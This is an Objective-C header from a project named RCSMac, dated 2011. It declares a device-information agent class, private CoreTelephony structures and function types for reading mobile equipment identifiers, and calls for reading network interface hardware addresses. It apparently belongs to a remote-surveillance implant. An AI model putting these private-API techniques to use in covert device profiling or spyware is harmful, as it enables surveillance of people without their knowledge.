//
//  RCSIAgentDevice.h
//  RCSMac
//
//  Created by kiodo on 3/11/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "RCSIAgent.h"

#import "RCSILogManager.h"

struct CTServerConnection
{
  int a;
  int b;
  CFMachPortRef myport;
  int c;
  int d;
  int e;
  int f;
  int g;
  int h;
  int i;
};

struct CTResult
{
  int flag;
  int a;
};

typedef struct CTServerConnection * (*CTServerConnectionCreate_t)(CFAllocatorRef, void *, int *);
typedef int* (*CTServerConnectionCopyMobileEquipmentInfo_t)(struct CTResult * Status,
                                                            struct CTServerConnection * Connection,
                                                            CFMutableDictionaryRef *Dictionary);

typedef NSArray*  (*SCNetworkInterfaceCopyAll_t)(void);
typedef NSString* (*SCNetworkInterfaceGetInterfaceType_t)(id	interface);
typedef NSString* (*SCNetworkInterfaceGetHardwareAddressString_t)(id interface);

@interface _i_AgentDevice : _i_Agent <Agents>
{
  u_int mAppList;
}

- (id)initWithConfigData:(NSData*)aData;
- (BOOL)writeDeviceInfo: (NSData*)aInfo;
- (BOOL)getDeviceInfo;
- (NSData*)getSystemInfoWithType:(NSString*)aType;

@end
